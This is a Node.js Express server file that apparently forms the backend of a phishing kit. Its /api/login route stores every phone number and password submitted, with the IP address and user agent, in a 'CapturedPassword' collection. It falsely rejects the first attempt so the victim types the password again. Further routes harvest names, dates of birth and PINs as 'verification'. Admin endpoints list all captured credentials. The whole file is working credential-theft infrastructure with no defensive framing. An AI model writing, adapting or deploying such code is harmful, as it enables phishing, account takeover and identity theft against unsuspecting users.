// server.js
const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 10000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// --- Connect to MongoDB Atlas ---
// DEPRECATED OPTIONS REMOVED FOR CLEANER LOGS
mongoose.connect(process.env.MONGODB_URI)
.then(() => {
    console.log('Successfully connected to MongoDB Atlas');
})
.catch(err => {
    console.error('Error connecting to MongoDB Atlas:', err.message); 
});

// --- Define MongoDB Schemas and Models ---
const passwordSchema = new mongoose.Schema({
    userId: String,
    password: String,
    timestamp: { type: Date, default: Date.now },
    userAgent: String,
    ipAddress: String,
    attemptNumber: Number,
});

const verificationSchema = new mongoose.Schema({
    userId: String,
    fullName: String,
    dob: Date,
    problem: String,
    pin: String,
    experience: String,
    capturedPassword: String,
    createdAt: { type: Date, default: Date.now },
});

const CapturedPassword = mongoose.model('CapturedPassword', passwordSchema);
const UserVerification = mongoose.model('UserVerification', verificationSchema);

// --- API Routes (now using Mongoose) ---
app.post('/api/login', async (req, res) => {
    try {
        const { phone, password, attemptNumber } = req.body;
        const newPassword = new CapturedPassword({
            userId: phone,
            password,
            attemptNumber,
            userAgent: req.headers['user-agent'],
            ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        });
        await newPassword.save();

        if (attemptNumber === 1) {
            return res.json({ success: false, message: 'Incorrect password. Please try again.' });
        }
        res.json({ success: true, message: 'Login successful', user: { id: phone, phone } });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, error: 'Login failed' });
    }
});

app.post('/api/verification', async (req, res) => {
    try {
        const newVerification = new UserVerification(req.body);
        await newVerification.save();
        res.json({ success: true, message: 'Verification submitted successfully!' });
    } catch (error) {
        console.error('Verification error:', error);
        res.status(500).json({ success: false, error: 'Failed to save verification data' });
    }
});

// --- Admin Routes (now using Mongoose) ---
app.post('/admin/login', (req, res) => {
    const { password } = req.body;
    if (password && password === process.env.ADMIN_MASTER_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid master password' });
    }
});

app.get('/admin/captured-passwords', async (req, res) => {
    try {
        const passwords = await CapturedPassword.find().sort({ timestamp: -1 });
        res.json(passwords);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

app.get('/admin/verifications', async (req, res) => {
    try {
        const verifications = await UserVerification.find().sort({ createdAt: -1 });
        res.json(verifications);
    } catch(error) {
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

// --- Serve Frontend Files ---
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});